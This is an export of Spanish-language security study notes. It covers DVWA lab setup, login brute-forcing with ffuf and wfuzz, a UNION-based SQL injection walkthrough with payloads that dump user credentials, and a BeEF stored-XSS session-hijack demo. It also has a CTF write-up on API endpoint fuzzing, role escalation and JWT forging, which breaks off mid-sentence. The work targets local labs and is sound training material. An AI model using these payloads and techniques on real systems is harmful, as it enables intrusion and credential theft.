[
  {
    "title": "0. Ciberseguridad",
    "path": "/apuntes/0-ciberseguridad/",
    "src": "content/Ciberseguridad/0. Ciberseguridad.md",
    "breadcrumb": "",
    "content": "1. [[0. Recursos Web]]\n2. [[0. THM]]\n3. [[0. CTFs]]",
    "modified": "2026-02-10T01:18:20"
  },
  {
    "title": "0. Recursos Web",
    "path": "/apuntes/recursos-web/0-recursos-web/",
    "src": "content/Ciberseguridad/Recursos Web/0. Recursos Web.md",
    "breadcrumb": "Recursos Web",
    "content": "[[1. DVWA]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. CTFs",
    "path": "/apuntes/ctfs/0-ctfs/",
    "src": "content/Ciberseguridad/CTFs/0. CTFs.md",
    "breadcrumb": "CTFs",
    "content": "[[1. Talent Arena]]",
    "modified": "2026-02-10T01:18:20"
  },
  {
    "title": "0. THM",
    "path": "/apuntes/thm/0-thm/",
    "src": "content/Ciberseguridad/THM/0. THM.md",
    "breadcrumb": "THM",
    "content": "1. [[0. Pre Career]]\n2. [[1. Career]]\n3. \n4. [[0. Advent of Cyber]]\n5. [[0. Maquinas]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. DVWA",
    "path": "/apuntes/recursos-web/1-dvwa/1-dvwa/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/1. DVWA.md",
    "breadcrumb": "Recursos Web > 1. DVWA",
    "content": "1. [[0. Configuration]]\n2. [[0. Brute Force]]\n3. [[Ciberseguridad/Recursos Web/1. DVWA/2. Command Injection/0. Command Injection]]\n4. [[Ciberseguridad/Recursos Web/1. DVWA/3. CSRF/0. CSRF]]\n5. [[Ciberseguridad/Recursos Web/1. DVWA/4. File Inclusion/0. File Inclusion]]\n6. [[0. File Upload]]\n7. [[0. Insecure CAPTCHA]]\n8. [[Ciberseguridad/Recursos Web/1. DVWA/7. SQL Injection/0. SQL Injection]]\n9. [[0. SQL Injection - Blind]]\n10. [[0. Weak Session IDs]]\n11. [[0. XSS - DOM]]\n12. [[0. XSS - Reflected]]\n13. [[0. XSS - Stored]]\n14. [[0. CSP Bypass]]\n15. [[0. JavaScript Attacks]]\n16. [[0. Authorisation Bypass]]\n17. [[0. Open HTTP Redirect]]\n18. [[0. Cryptography]]\n19. [[0. API]]",
    "modified": "2026-02-10T01:18:20"
  },
  {
    "title": "0. XSS - Reflected",
    "path": "/apuntes/recursos-web/1-dvwa/11-xss-reflected/0-xss-reflected/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/11. XSS - Reflected/0. XSS - Reflected.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 11. XSS - Reflected",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Cryptography",
    "path": "/apuntes/recursos-web/1-dvwa/17-cryptography/0-cryptography/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/17. Cryptography/0. Cryptography.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 17. Cryptography",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Command Injection",
    "path": "/apuntes/recursos-web/1-dvwa/2-command-injection/0-command-injection/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/2. Command Injection/0. Command Injection.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 2. Command Injection",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. CSP Bypass",
    "path": "/apuntes/recursos-web/1-dvwa/13-csp-bypass/0-csp-bypass/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/13. CSP Bypass/0. CSP Bypass.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 13. CSP Bypass",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. File Inclusion",
    "path": "/apuntes/recursos-web/1-dvwa/4-file-inclusion/0-file-inclusion/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/4. File Inclusion/0. File Inclusion.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 4. File Inclusion",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Insecure CAPTCHA",
    "path": "/apuntes/recursos-web/1-dvwa/6-insecure-captcha/0-insecure-captcha/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/6. Insecure CAPTCHA/0. Insecure CAPTCHA.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 6. Insecure CAPTCHA",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. API",
    "path": "/apuntes/recursos-web/1-dvwa/18-api/0-api/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/18. API/0. API.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 18. API",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Open HTTP Redirect",
    "path": "/apuntes/recursos-web/1-dvwa/16-open-http-redirect/0-open-http-redirect/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/16. Open HTTP Redirect/0. Open HTTP Redirect.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 16. Open HTTP Redirect",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Brute Force",
    "path": "/apuntes/recursos-web/1-dvwa/1-brute-force/0-brute-force/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/1. Brute Force/0. Brute Force.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 1. Brute Force",
    "content": "[[Ciberseguridad/Recursos Web/1. DVWA/1. Brute Force/1. Breaking the Logging Form]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Breaking the Logging Form",
    "path": "/apuntes/recursos-web/1-dvwa/1-brute-force/1-breaking-the-logging-form/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/1. Brute Force/1. Breaking the Logging Form.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 1. Brute Force",
    "content": "Para romper este portal de login, vamos a usar dos herramientas distintas:\n\n- FFUF\n- WFUZZ\n\n![[Pasted image 20251203172440.png]]\n\n---------------------------------\n<h2>FFUF</h2>\n1. Si abrimos las herramientas de desarrollador, podemos ver que en la petici√≥n se mandan los par√°metros `username` y `password` por GET.\n   ![[Pasted image 20251203174307.png]]\n2. Podemos ver que hay una cookie de sesi√≥n adem√°s.\n   ![[Pasted image 20251203174358.png]]\n3. Usamos `ffuf` para el ataque.\n   ![[Pasted image 20251203175228.png]]\n   Como la longitud es siempre la misma, vamos a restringirla.\n4. Arreglamos el comando y le a√±adimos `time` para poder compararla despu√©s.\n   ![[Pasted image 20251203180015.png]]\n5. Iniciamos sesi√≥n con las credenciales.\n   ![[Pasted image 20251203175900.png]]\n\n-----------------------------------------------\n<h2>WFUZZ</h2>\n1. Cerramos y volvemos a iniciar sesi√≥n, mandamos una petici√≥n y vemos que seguimos teniendo una cookie y el m√©todo es GET con par√°metros `username` y `password`.\n   ![[Pasted image 20251204105136.png]]\n2. Metemos el comando correspondiente:\n   ![[Pasted image 20251204113336.png]]\n3. Obtenemos las mismas credenciales con ambos, nos registramos.\n   ![[Pasted image 20251203175900.png]]\n\n----------------------------------------------------\n\n>[!NOTE] Conclusi√≥n: Aunque ambos sirven y nos han reportado correctamente el usuario:contrase√±a, WFUZZ ha demostrado ser m√°s eficiente. Sin embargo, la documentaci√≥n CLI est√° mejor redactada (y tiene m√°s ejemplos, por lo que es m√°s clara) del lado de FFUF. Cada una tiene sus ventajas, queda a preferencia del usuario.",
    "modified": "2026-01-23T00:56:08"
  },
  {
    "title": "0. CSRF",
    "path": "/apuntes/recursos-web/1-dvwa/3-csrf/0-csrf/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/3. CSRF/0. CSRF.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 3. CSRF",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. SQL Injection - Blind",
    "path": "/apuntes/recursos-web/1-dvwa/8-sql-injection-blind/0-sql-injection-blind/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/8. SQL Injection - Blind/0. SQL Injection - Blind.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 8. SQL Injection - Blind",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Breaking the Logging Form",
    "path": "/apuntes/recursos-web/1-dvwa/7-sql-injection/1-breaking-the-logging-form/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/7. SQL Injection/1. Breaking the Logging Form.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 7. SQL Injection",
    "content": "Vamos a intentar una inyecci√≥n SQL manual aprovechndo que esta es vista (hay otra Blind para m√°s adelante).\n\n![[Pasted image 20251204121001.png]]\n\n--------------------------------------------\n1. Vamos a introducir una consulta \"v√°lida\".\n   ![[Pasted image 20251204121253.png]]\n2. Recibimos esta respuesta.\n   ![[Pasted image 20251204121418.png]]\n   La URL queda tal que as√≠:\n   ![[Pasted image 20251204122131.png]]\n   Por lo tanto sabemos que m√≠nimo hay tres campos, que son los que nos est√° mostrando la web.\n3. Sabemos qu ees vulnerable a SQLI porque si metemos una comilla nos da error 500.\n   ![[Pasted image 20251204122328.png]]\n4. Vamos a hacer un ejercicio para ver cu√°ntas columnas hay.\n\t1. Empezamos con `1' UNION SELECT 1,2,3-- -` que sabemos que es v√°lido, pues m√≠nimo hay 3 campos bas√°ndonos en el output de antes.\n\t   ![[Pasted image 20251204124300.png]]\n\t   Parece ser que hemos errado en nuestra suposici√≥n. Estudiaremos por qu√©.\n\t2. Vamos a probar con el `1' UNION SELECT 1,2-- -`.\n\t   ![[Pasted image 20251204124351.png]]\n\t   Parece que ahora si que hemos obtenido informaci√≥n relevante.\n5. Para obtener informaci√≥n sobre la base de datos, empezaremos a sustituir y en lugar del 1, pondremos la query que queramos ver.\n\t1. Empezamos sustituyendo el 1 por `database()`:  `1' UNION SELECT database(),2-- -`.\n\t   ![[Pasted image 20251204124647.png]]\n\t   Ah√≠ podemos ver que el nombre de la base de datos es `dvwa`.\n\t2. Seguimos indagando en el nombre de las tablas con: `1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'dvwa'-- -`.\n\t   ![[Pasted image 20251204163630.png]]\n\t   Parece que nos puede interesar la tabla \"users\".\n\t3. Vamos a sacar el nombre de las columnas con la query: `1' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users'-- -`.\n\t   ![[Pasted image 20251204164241.png]]\n\t   Los campos que m√°s nos interesan a priori son `user` y `password`. Y el de `role` puede estar interesante para diferenciar posibles admins sin tener que mirar el nombre.\n\t4. Los extraemos con la query: `1' UNION SELECT 1,group_concat(user,':',password,':',role SEPARATOR '<br>') FROM users -- -`.\n\t   ![[Pasted image 20251204164608.png]]\n\n>[!SUCCESS] Hemos conseguido vulnerar la base de datos y obtener nombre, contrase√±a y rol de todos los usuarios registrados en ella.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. SQL Injection",
    "path": "/apuntes/recursos-web/1-dvwa/7-sql-injection/0-sql-injection/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/7. SQL Injection/0. SQL Injection.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 7. SQL Injection",
    "content": "[[Ciberseguridad/Recursos Web/1. DVWA/7. SQL Injection/1. Breaking the Logging Form]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. File Upload",
    "path": "/apuntes/recursos-web/1-dvwa/5-file-upload/0-file-upload/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/5. File Upload/0. File Upload.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 5. File Upload",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. JavaScript Attacks",
    "path": "/apuntes/recursos-web/1-dvwa/14-javascripts-attacks/0-javascript-attacks/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/14. JavaScripts Attacks/0. JavaScript Attacks.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 14. JavaScripts Attacks",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. XSS - DOM",
    "path": "/apuntes/recursos-web/1-dvwa/10-xss-dom/0-xss-dom/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/10. XSS - DOM/0. XSS - DOM.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 10. XSS - DOM",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Breaking the Messaging Service",
    "path": "/apuntes/recursos-web/1-dvwa/12-xss-stored/1-breaking-the-messaging-service/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/12. XSS - Stored/1. Breaking the Messaging Service.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 12. XSS - Stored",
    "content": "Para romper este servicio de mensajer√≠a y poder mandar ataques contra el navegador de la v√≠ctima, vamos a descargarnos la herramienta [BeEF](https://github.com/beefproject/beef) (The Browser Exploitation Framework).\n\n![[Pasted image 20251204165821.png]]\n\n------------------------------------------\n1. Instalamos BeEF.\n   - `sudo apt update`\n   - `sudo apt install beef-xss`\n   - `sudo beef-xss`\n     ![[Pasted image 20251204170837.png]]\n     Con esto hemos iniciado el servicio beef-xss, que contiene el script `hook.js`. \n2. Ahora inyectamos el c√≥digo malicioso en la aplicaci√≥n vulnerable.\n   ![[Pasted image 20251205181207.png]]\n3. Como no nos deja meterlo todo, inspeccionamos el elemento y cambiamos el valor de `maxlength` a 150, por ejemplo.\n   ![[Pasted image 20251210153942.png]]\n4. Ahora ya s√≠ nos deja.\n   ![[Pasted image 20251210154155.png]]\n5. Le damos a Sign Guestbook.\n   ![[Pasted image 20251210154235.png]]\n6. Y nos aparece la sesi√≥n en BeEF.\n   ![[Pasted image 20251210154308.png]]\n7. Ahora comienza la parte divertida: lanzar ataques.\n\t1. Empezaremos lanzando un ataque contra el navegador.\n\t\t1. Si desplegamos \"Browser\" en \"Commands\" podemos ver todas las opciones que tenemos.\n\t\t   ![[Pasted image 20251210155158.png]]\n\t\t2. Si le damos a \"Get Cookie\" (verde) nos aparece un apartado a la derecha.\n\t\t   ![[Pasted image 20251210160107.png]]\n\t\t3. Si le damos a ejecutar nos aparece la cookie de sesi√≥n.\n\t\t   ![[Pasted image 20251210160508.png]]\n\t2. Vamos a lanzar otro pero ahora contra el host.\n\t\t1. Le damos a \"Get Geolocation\" en \"Host\".\n\t\t   ![[Pasted image 20251210160600.png]]\n\t\t2. Seleccionamos cualquier API (yo la primera).\n\t\t   ![[Pasted image 20251210160652.png]]\n\t\t3. Y ejecutamos y nos sale la geolocation.\n\t\t   ![[Pasted image 20251210161116.png]]\n\t\t   Salen muchas m√°s cosas que obviamente he ocultado por privacidad xD\n\t3. Si le damos a \"Get HREFs\" en \"Hooked Domains\" podemos obtener los hiperv√≠nculos en la p√°gina.\n\t   ![[Pasted image 20251210163351.png]]\n\t4. Si le damos a \"Shell Shock Scanner (Reverse Shell)\":\n\t   ![[Pasted image 20251210165359.png]]\n\t   ![[Pasted image 20251210165442.png]]\n\t5. Vamos a reescribir los hiperv√≠nculos.\n\t\t1. Si vamos a \"Browser\" luego a \"Hooked Domains\" y a \"Link Rewrite (Click Events)\" y lo ejecutamos.\n\t\t   ![[Pasted image 20251210170126.png]]\n\t\t2. Abrimos la p√°gina con hiperv√≠nculo.\n\t\t   ![[Pasted image 20251210170142.png]]\n\t\t3. Vamos a la p√°gina abierta.\n\t\t   ![[Pasted image 20251210170211.png]]\n\n\n------------------------------------------------\n<h2>Archivo hook.js</h2>\n\n| √Årea                             | Qu√© hace                                           |\n| -------------------------------- | -------------------------------------------------- |\n| **Constructor jQuery**           | Crea objetos jQuery y selecciona elementos del DOM |\n| **Manipulaci√≥n del DOM**         | Navegar, filtrar, modificar HTML y atributos       |\n| **Sizzle ‚Äì Motor de selectores** | Interpreta selectores CSS y encuentra elementos    |\n| **Utilidades**                   | Funciones de ayuda (array, objetos, strings)       |\n| **Callbacks / Deferred**         | Manejo asincr√≥nico avanzado                        |\n| **Data API**                     | Almacenar y recuperar datos en el DOM              |\n| **Ready / Carga del documento**  | Detectar cu√°ndo el DOM est√° listo                  |\n| **Compatibilidad / Soporte**     | Normalizaci√≥n entre navegadores                    |\n| **Eventos**                      | Manejo unificado de eventos (on/off/trigger)       |\n| **AJAX**                         | Comunicaci√≥n asincr√≥nica con el servidor           |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. XSS - Stored",
    "path": "/apuntes/recursos-web/1-dvwa/12-xss-stored/0-xss-stored/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/12. XSS - Stored/0. XSS - Stored.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 12. XSS - Stored",
    "content": "[[1. Breaking the Messaging Service]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Authorisation Bypass",
    "path": "/apuntes/recursos-web/1-dvwa/15-authorisation-bypass/0-authorisation-bypass/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/15. Authorisation Bypass/0. Authorisation Bypass.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 15. Authorisation Bypass",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Weak Session IDs",
    "path": "/apuntes/recursos-web/1-dvwa/9-weak-session-ids/0-weak-session-ids/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/9. Weak Session IDs/0. Weak Session IDs.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 9. Weak Session IDs",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Configuration",
    "path": "/apuntes/recursos-web/1-dvwa/0-configuration/0-configuration/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/0. Configuration/0. Configuration.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 0. Configuration",
    "content": "[[1. Configuration]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Configuration",
    "path": "/apuntes/recursos-web/1-dvwa/0-configuration/1-configuration/",
    "src": "content/Ciberseguridad/Recursos Web/1. DVWA/0. Configuration/1. Configuration.md",
    "breadcrumb": "Recursos Web > 1. DVWA > 0. Configuration",
    "content": "<h2>AVISO IMPORTANTE</h2>\n>[!CAUTION] ATENCI√ìN!: No sirvas DVWA en un servidor p√∫blico, ten cuidado y lee la documentaci√≥n de su p√°gina web oficial. Esto es s√≥lo una gu√≠a r√°pida para aquellos que entienden los riesgos de instalar aplicaciones vulnerables y no me hago responsable de nada\n\n-------------------------------------\n<h2>Pasos</h2>\n1. Clonamos el [repositorio oficial](https://github.com/digininja/DVWA?tab=readme-ov-file) desde GitHub en `/var/www/html/`.\n   ![[Pasted image 20251203163530.png]]\n2. Iniciamos el servicio `apache2`.\n   ![[Pasted image 20251203163939.png]]\n3. Nos metemos en el directorio DVWA y ejecutamos el siguiente comando.\n   ![[Pasted image 20251203164154.png]]\n4. Podemos mirar la contrase√±a y el usuario en este archivo`php`.\n5. Comenzamos el servicio `mariadb` (en kali).\n   ![[Pasted image 20251203164515.png]]\n6. Iniciamos sesi√≥n como root en mariaDB.\n   ![[Pasted image 20251203164822.png]]\n7. Seguimos los pasos de configuraci√≥n de la base de datos.\n\t1. Creamos la base de datos `dvwa`.\n\t   ![[Pasted image 20251203164939.png]]\n\t2. Creamos en usuario con la contrase√±a.\n\t   ![[Pasted image 20251203165151.png]]\n\t3. Le damos permisos al usuario en la base de datos correspondiente.\n\t   ![[Pasted image 20251203165638.png]]\n\t4. Recargamos la cach√© de privilegios (necesario despu√©s de editar manualmente privilegios).\n\t   ![[Pasted image 20251203165758.png]]\n8. Ya podemos iniciar sesi√≥n en la base de datos.\n   ![[Pasted image 20251203170008.png]]\n9. Usamos la base de datos `dvwa`.\n   ![[Pasted image 20251203171107.png]]\n10. Vamos a `http://localhost/DVWA/login.php`.\n    ![[Pasted image 20251203171243.png]]\n11. Iniciamos sesi√≥n y le damos al bot√≥n `Create / Reset Database` abajo del todo y nos logueamos con `admin:password` (tal cual, no es un placeholder).\n    ![[Pasted image 20251203171631.png]]\n\n>[!CAUTION] Recuerda configurar la dificultad al nivel que quieras.\n\nEn mi caso yo la pondr√© en `low` y le dar√® a `submit`.\n\n![[Pasted image 20251203174130.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Talent Arena",
    "path": "/apuntes/ctfs/1-talent-arena/1-talent-arena/",
    "src": "content/Ciberseguridad/CTFs/1. Talent Arena/1. Talent Arena.md",
    "breadcrumb": "CTFs > 1. Talent Arena",
    "content": "1. [[0. 2026]]\n2.",
    "modified": "2026-02-10T01:18:20"
  },
  {
    "title": "0. 2026",
    "path": "/apuntes/ctfs/1-talent-arena/2026/0-2026/",
    "src": "content/Ciberseguridad/CTFs/1. Talent Arena/2026/0. 2026.md",
    "breadcrumb": "CTFs > 1. Talent Arena > 2026",
    "content": "1. [[0. OSINT]]\n2. [[0. Web]]\n3. [[0. Reverse Engineering]]\n4.",
    "modified": "2026-02-10T01:18:20"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/ctfs/1-talent-arena/2026/2-web/1-introduction/",
    "src": "content/Ciberseguridad/CTFs/1. Talent Arena/2026/2. Web/1. Introduction.md",
    "breadcrumb": "CTFs > 1. Talent Arena > 2026 > 2. Web",
    "content": "<h2>Companion API - CTF Challenge</h2>\n\n<h3>Welcome, Hacker!</h3>\nYou've been hired as a security consultant to assess **Companion API**, a mobile backend API for a major event management platform. The organizers want to ensure their attendee management system is secure before the big event.\n\nYour mission: Find the vulnerabilities in this API and retrieve the flag.\n\n<h3>The Scenario</h3>\nCompanion API is a REST API that handles:\n\n- Attendee authentication\n- Ticket management for event sessions\n- Internal staff tools\n\nThe development team claims the API is \"production ready.\" Prove them wrong.\n\n<h3>Getting Started</h3>\n\n<h4>Prerequisites</h4>\n\n- Docker and Docker Compose installed\n- A REST client (curl, Postman, Burp Suite, etc.)\n- Your hacking skills\n\n<h4>Running the Challenge</h4>\n\n1. Extract the challenge files:\n    \n    `unzip web-challenge.zip`\n    \n2. Start the service:\n    \n    `./START.sh`\n    \n3. The API is now available at: **[http://127.0.0.1:8080](http://127.0.0.1:8080)**\n\nTo stop the challenge:\n\n```bash\ndocker compose down\n```\n\n<h3>Rules of Engagement</h3>\n\n- This is an **API hacking** challenge - focus on the REST endpoints\n- The flag format is: `MWC{...}`\n- To finalize the challenge there is an endpoint to get the full flag: `/api/v1/finalize`\n    \n    - POST request with the following data:\n    \n    `\"fragment_1\": \"<FRAGMENT_2003>\",`\n    `\"fragment_2\": \"<FRAGMENT_2>\",`\n    `\"fragment_3\": \"<FRAGMENT_3>\",`\n    \n    - If data is correct you will get the flag.\n\n<h3>Objective</h3>\nFind and submit the flag. The flag proves you've successfully identified and exploited all the intended vulnerabilities in the chain.\n\nGood luck, hacker!\n\n----------------------------------------------------------\n<h2>Companion API - Reto CTF</h2>\n\n<h3>Bienvenido, Hacker!</h3>\nTe han contratado como consultor de seguridad para evaluar Companion API, una API de backend m√≥vil para una importante plataforma de gesti√≥n de eventos. Los organizadores quieren garantizar la seguridad de su sistema de gesti√≥n de asistentes antes del gran evento.\n\nTu misi√≥n: Encontrar las vulnerabilidades en esta API y detectarlas.\n\n<h3>El Esenario</h3>\nLa API complementaria es una API REST que gestiona:\n\n- Autenticaci√≥n de asistentes\n- Gesti√≥n de tickets para sesiones de eventos\n- Herramientas internas para el personal\n\nEl equipo de desarrollo afirma que la API est√° lista para producci√≥n. Demu√©strales que se equivocan.\n\n<h3>Getting Started</h3>\n\n<h4>Pre-requisitos</h4>\n\n- Docker y Docker Compose instalados\n- Un cliente REST (curl, Postman, Burp Suite, etc.)\n- Tus habilidades de hacking\n\n<h4>Ejecutar el Reto</h4>\n1. Extraiga los archivos del desaf√≠o:\n   \n   `unzip web-challenge.zip`\n\n2. Inicie el servicio:\n   \n   `./START.sh`\n\n3. La API ya est√° disponible en: **[http://127.0.0.1:8080](http://127.0.0.1:8080)**\n\nPara detener el desaf√≠o:\n\n```bash\ndocker compose down\n```\n\n<h3>Reglas del Engagement</h3>\nEste es un desaf√≠o de **hacking de API**: se centra en los endpoints REST.\n- El formato de la bandera es: `MWC{...}`.\n- Para finalizar el desaf√≠o, hay un endpoint para obtener la bandera completa: `/api/v1/finalize`.\n\n- Solicitud POST con los siguientes datos:\n\n`\"fragment_1\": \"<FRAGMENT_2003>\",`\n`\"fragment_2\": \"<FRAGMENT_2>\",`\n`\"fragment_3\": \"<FRAGMENT_3>\",`\n\n- Si los datos son correctos, se obtendr√° la bandera.\n<h3>Objectivo</h3>\nEncuentra y env√≠a la bandera. Esta bandera demuestra que has identificado y explotado con √©xito todas las vulnerabilidades previstas en la cadena.\n\n¬°Buena suerte, hacker!",
    "modified": "2026-02-10T01:18:20"
  },
  {
    "title": "2. Companion API",
    "path": "/apuntes/ctfs/1-talent-arena/2026/2-web/2-companion-api/",
    "src": "content/Ciberseguridad/CTFs/1. Talent Arena/2026/2. Web/2. Companion API.md",
    "breadcrumb": "CTFs > 1. Talent Arena > 2026 > 2. Web",
    "content": "1. Vamos a la direcci√≥n de la API donde encontramos las siguientes instrucciones:\n   ![[Pasted image 20260210184552.png]]\n2. Realizamos la petici√≥n por cURL.\n   ![[Pasted image 20260210184637.png]]\n   Guardamos este token en una variable de entorno.\n3. Vamos a intentar encontrar endpoints.\n\t1. Trasteando por la p√°gina encontramos lo siguiente:\n\t   ![[Pasted image 20260210185020.png]]\n\t   Esto significa que conocemos los endpoints:\n\t\t- `/api/v1/auth`\n\t\t  ![[Pasted image 20260210185857.png]]\n\t\t- `/api/v1/tickets`\n\t\t  ![[Pasted image 20260210185932.png]]\n\t\t- `/api/v1/users`\n\t\t  ![[Pasted image 20260210185949.png]]\n\t2. Vamos a buscar ahora fuzzeando. Nosotros sabemos que muy seguramente haya alg√∫n endpoint para admin, por lo que vamos a fuzzear ah√≠.\n\t   ![[Pasted image 20260210185726.png]]\n\t   Parece que hemos encontrado otro endpoint: `/api/v1/admin/console`.\n\t   \n\t   En total tenemos los siguientes endpoints para investigar:\n\t   - `/api/v1/auth/login`\n\t   - `/api/v1/users/me`\n\t   - `/api/v1/tickets`\n\t   - `/api/v1/admin/console`\n4. Vamos  a comenzar la investigaci√≥n de los endpoints.\n\t1. Empezaremos por ver que opciones de m√©todo tiene cada uno de ellos.\n\t\t1. `/api/v1/auth/login`:\n\t\t   ![[Pasted image 20260210190408.png]]\n\t\t2. `/api/v1/users/me`:\n\t\t   ![[Pasted image 20260210190427.png]]\n\t\t3. `/api/v1/tickets`:\n\t\t   ![[Pasted image 20260210190549.png]]\n\t\t   Parece que este endpoint necesita un id para obtener el ticket, lo investigaremos m√°s adelante.\n\t\t4. `/api/v1/admin/console`:\n\t\t   ![[Pasted image 20260210190643.png]]\n\t2. Teniendo ya todos los m√©todos parece que podemos ver que todos son `GET` o `POST` menos uno. En `/api/v1/users/me` est√° permitido el m√©todo `PATCH`.\n\t   ![[Pasted image 20260210190820.png]]\n\t   Parece que podemos haber encontrado un m√©todo para modificar alg√∫n par√°metro importante.\n5. Para seguir investigando endpoints, vamos a ver si podemos obtener alg√∫n ticket, aprovech√°ndonos de que este id iba metido en el propio endpoint.\n\t1. Para ello vamos a crear una lista con una secuencia de n√∫meros de 0000 a 9999.\n\t   ![[Pasted image 20260210191045.png]]\n\t2. Una vez creada vamos a fuzzear el endpoint `/api/v1/tickets/numero`.\n\t   ![[Pasted image 20260210191237.png]]\n\t3. Parece que hemos encontrado ciertos tickets a los que se puede acceder. Vamos a hacer peticiones y observar los resultados.\n\t   ![[Pasted image 20260210192035.png]]\n\t   Parece que acabamos de encontrar el primer fragmento (referido en las instrucciones del reto como `FRAGMENT_2003`): `zWSPcwMG3Y1M`.\n6. Hemos observado tambi√©n una ruta: `/api/v1/dev/panel`. Vamos a probar a entrar.\n   ![[Pasted image 20260210192656.png]]\n   Parece que s√≥lo `staff` puede verlo.\n7. Adem√°s de encontrar el primer fragmento, hemos podido observar que hay al menos un rol m√°s: `staff`. Si vamos a ver lo que nos devuelve el endpoint `/api/v1/users/me`:\n   ![[Pasted image 20260210192416.png]]\n8. Recordamos que en este endpoint podemos usar el m√©todo `PATCH`, por lo que vamos a probar a cambiarnos el par√°metro `role`.\n   ![[Pasted image 20260210192535.png]]\n   Parece que ha funcionado.\n9. Vamos a obtener un nuevo token, ahora como `staff`, gracias al m√©todo `PATCH`. Metemos el token en una nueva variable de entorno.\n   ![[Pasted image 20260210192917.png]]\n10. Con dicho token intentamos volver a acceder al panel de `staff`.\n    ![[Pasted image 20260210193010.png]]\n    Parece que acabamos de encontrar el segundo fragmento: `lYE3tlwIp_Mk`. Adem√°s parece que hay otra ruta.\n11. Vamos a ver qu√© hay en dicha ruta.\n    ![[Pasted image 20260210193146.png]]\n    Parece que acabamos de encontrar la clave de firmado de los JWTs.\n12. En [JWT.io](www.jwt.io) podemos comprobar que efectivamente lo es.\n    ![[Pasted image 20260210193403.png]]\n13. Si le damos a la opci√≥n de `JWT Encoder`, en lugar de `JWT Decoder` podemos modificar el contenido del token.\n    ![[Pasted image 20260210193512.png]]\n14. Antes de proceder a comprobar si funciona, vamos a intentar acceder al endpoint `/api/v1/admin/console` con el token actual para comprobar que no funciona.\n    ![[Pasted image 20260210193616.png]]\n15. Si guardamos el token de administrador y hacemos otra petici√≥n:\n    ![[Pasted image 20260210193716.png]]\n    Efectivamente obtenemos el fragmento tres: `3bvyvMCM0StL`.\n16. Pero el reto no se acaba aqu√≠, como dice en las instrucciones debemos hacer una √∫ltima petici√≥n a `/api/v1/finalize` con los tres fragmentos encontrados para obtener la 